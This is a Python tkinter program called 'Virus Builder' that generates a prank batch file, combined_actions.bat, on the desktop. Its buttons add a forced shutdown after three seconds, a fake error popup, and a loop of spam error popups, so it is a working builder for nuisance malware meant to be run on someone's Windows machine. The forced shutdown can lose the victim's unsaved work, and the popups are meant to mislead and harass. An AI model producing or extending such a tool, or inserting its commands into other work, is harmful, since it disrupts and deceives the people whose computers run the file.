import tkinter as tk
import os
from tkinter import messagebox

class bcolors:
    GREEN = 'green'
    YELLOW = 'yellow'
    RED = 'red'
    RESET = 'black'

def background():
    root.configure(bg=bcolors.RESET)

def get_desktop_path():
    if os.name == 'nt':  # Windows
        return os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    elif os.name == 'posix':  # Unix/Linux/Mac
        return os.path.join(os.path.expanduser('~'), 'Desktop')
    else:
        raise Exception('Unsupported OS')

def create_file(contents):
    desktop_path = get_desktop_path()
    file_path = os.path.join(desktop_path, 'combined_actions.bat')
    
    with open(file_path, 'w') as file:
        for content in contents:
            file.write(content + "\n")
    
    print(f"File created at {file_path}")

def add_shutdown_action():
    contents.append("shutdown -s -t 3")
    messagebox.showinfo("Info", "Shutdown action added")

def add_fake_error_action():
    contents.append('msg * "This is a fake error message"')
    messagebox.showinfo("Info", "Fake error action added")

def add_spam_error_action():
    contents.append('for /L %%i in (1, 1, 10) do msg * "This is a spam error message"')
    messagebox.showinfo("Info", "Spam error action added")

def save_and_exit():
    create_file(contents)
    root.destroy()

root = tk.Tk()
root.title("Virus Builder")

screen_width = 500
screen_height = 500
root.geometry(f'{screen_width}x{screen_height}')

contents = []

# Überschrift mit rotem Rand und schwarzem Hintergrund
L1 = tk.Label(root, text='Virus Builder', fg=bcolors.RED, bg='black', bd=2, relief='solid', font=("Helvetica", 16, "bold"))
L1.pack(pady=10)

# Buttons mit rotem Rand und schwarzem Hintergrund
B1 = tk.Button(root, text='Add Fake Error', fg=bcolors.RED, bg='black', bd=2, relief='solid', highlightbackground=bcolors.RED, command=add_fake_error_action)
B1.pack(pady=10)

B2 = tk.Button(root, text='Add Shutdown', fg=bcolors.RED, bg='black', bd=2, relief='solid', highlightbackground=bcolors.RED, command=add_shutdown_action)
B2.pack(pady=10)

B4 = tk.Button(root, text='Add Spam Error', fg=bcolors.RED, bg='black', bd=2, relief='solid', highlightbackground=bcolors.RED, command=add_spam_error_action)
B4.pack(pady=10)

B3 = tk.Button(root, text='Save & Exit', fg=bcolors.RED, bg='black', bd=2, relief='solid', highlightbackground=bcolors.RED, command=save_and_exit)
B3.pack(pady=10)

background()
root.mainloop()
